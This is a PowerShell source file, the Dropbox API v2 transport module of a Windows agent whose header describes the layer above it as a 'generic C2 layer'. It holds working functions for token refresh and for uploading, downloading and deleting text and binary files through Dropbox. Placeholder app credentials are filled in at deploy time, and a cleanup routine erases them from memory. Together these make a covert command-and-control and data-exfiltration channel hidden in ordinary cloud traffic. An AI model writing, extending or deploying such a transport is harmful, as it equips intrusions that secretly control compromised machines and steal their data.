# === TRANSPORT: Dropbox API v2 ===
# Provider-specific transport layer for the Windows agent.
# Functions called by agent/core.ps1 (generic C2 layer).
# Credentials are base64 placeholders substituted by the wizard at deploy time.
# To add a new provider: implement Invoke-TransportRefresh/Upload/Download/UploadBinary/DownloadBinary/Delete + Clear-Transport.

$script:APP_KEY       = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_APP_KEY_B64"))
$script:APP_SECRET    = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_APP_SECRET_B64"))
$script:REFRESH_TOKEN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_REFRESH_TOKEN_B64"))
$script:ACCESS_TOKEN  = ""

function Invoke-TransportRefresh {
    Write-Log "[TOKEN]: Refreshing access token..."

    $body = @{
        refresh_token = $REFRESH_TOKEN
        grant_type    = "refresh_token"
        client_id     = $APP_KEY
        client_secret = $APP_SECRET
    }

    try {
        $response = Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" `
            -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"

        if ($response.access_token) {
            $script:ACCESS_TOKEN = $response.access_token
            Write-Log "[TOKEN]: [OK] Token updated (in-memory)"
            return $true
        }
    } catch {
        Write-Log "[TOKEN]: [X] Refresh ERROR: $($_.Exception.Message)"
    }
    return $false
}

function Invoke-TransportUpload {
    param(
        [string]$Path,
        [string]$Content
    )

    $headers = @{
        "Authorization" = "Bearer $script:ACCESS_TOKEN"
        "Dropbox-API-Arg" = "{`"path`":`"$Path`",`"mode`":`"overwrite`",`"autorename`":false}"
        "Content-Type" = "application/octet-stream"
    }

    $bodyBytes = [Text.Encoding]::UTF8.GetBytes($Content)

    try {
        $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
            -Method POST -Headers $headers -Body $bodyBytes
        return $response
    } catch {
        if ($_.Exception.Message -match "expired_access_token|invalid_access_token|401") {
            Write-Log "[API]: Token expired, refreshing..."
            if (Invoke-TransportRefresh) {
                $headers["Authorization"] = "Bearer $script:ACCESS_TOKEN"
                $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
                    -Method POST -Headers $headers -Body $bodyBytes
                return $response
            }
        }
        return $null
    }
}

function Invoke-TransportDownload {
    param([string]$Path)

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bearer $script:ACCESS_TOKEN")
        $wc.Headers.Add("Dropbox-API-Arg", "{""path"":""$Path""}")
        $responseBytes = $wc.UploadData("https://content.dropboxapi.com/2/files/download", "POST", [byte[]]@())
        return [Text.Encoding]::UTF8.GetString($responseBytes)
    } catch [System.Net.WebException] {
        $errMsg = $_.Exception.Message
        # Extract response body for detailed error
        $errBody = ""
        if ($_.Exception.Response) {
            try {
                $errStream = $_.Exception.Response.GetResponseStream()
                $errReader = New-Object System.IO.StreamReader($errStream)
                $errBody = $errReader.ReadToEnd()
                $errReader.Close()
            } catch {}
        }
        if ($errMsg -match "expired_access_token|invalid_access_token|401" -or $errBody -match "expired_access_token|invalid_access_token") {
            Write-Log "[API]: Token expired, refreshing..."
            if (Invoke-TransportRefresh) {
                return (Invoke-TransportDownload -Path $Path)
            }
        }
        if ($errBody) {
            Write-Log "[API]: Download error: $errMsg | Detail: $errBody"
        } else {
            Write-Log "[API]: Download error: $errMsg"
        }
        return $null
    } catch {
        Write-Log "[API]: Download error: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-TransportUploadBinary {
    param(
        [string]$Path,
        [byte[]]$Data
    )

    $headers = @{
        "Authorization" = "Bearer $script:ACCESS_TOKEN"
        "Dropbox-API-Arg" = "{`"path`":`"$Path`",`"mode`":`"overwrite`",`"autorename`":false}"
        "Content-Type" = "application/octet-stream"
    }

    try {
        $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
            -Method POST -Headers $headers -Body $Data
        return $response
    } catch {
        if ($_.Exception.Message -match "expired_access_token|invalid_access_token|401") {
            if (Invoke-TransportRefresh) {
                $headers["Authorization"] = "Bearer $script:ACCESS_TOKEN"
                $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
                    -Method POST -Headers $headers -Body $Data
                return $response
            }
        }
        return $null
    }
}

function Invoke-TransportDownloadBinary {
    param([string]$Path)

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bearer $script:ACCESS_TOKEN")
        $wc.Headers.Add("Dropbox-API-Arg", "{""path"":""$Path""}")
        return $wc.UploadData("https://content.dropboxapi.com/2/files/download", "POST", [byte[]]@())
    } catch [System.Net.WebException] {
        if ($_.Exception.Message -match "expired_access_token|invalid_access_token|401") {
            if (Invoke-TransportRefresh) {
                return (Invoke-TransportDownloadBinary -Path $Path)
            }
        }
        return $null
    } catch {
        return $null
    }
}

function Invoke-TransportDelete {
    param([string]$Path)

    $body = "{`"path`":`"$Path`"}"
    $headers = @{
        "Authorization" = "Bearer $script:ACCESS_TOKEN"
        "Content-Type" = "application/json"
    }

    try {
        Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/delete_v2" `
            -Method POST -Headers $headers -Body $body | Out-Null
        return $true
    } catch {
        if ($_.Exception.Message -match "expired_access_token|invalid_access_token|401") {
            if (Invoke-TransportRefresh) {
                $headers["Authorization"] = "Bearer $script:ACCESS_TOKEN"
                Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/delete_v2" `
                    -Method POST -Headers $headers -Body $body | Out-Null
                return $true
            }
        }
        return $false
    }
}

function Clear-Transport {
    Remove-Variable -Name APP_KEY, APP_SECRET, REFRESH_TOKEN, ACCESS_TOKEN -Scope Script -Force 2>$null
}

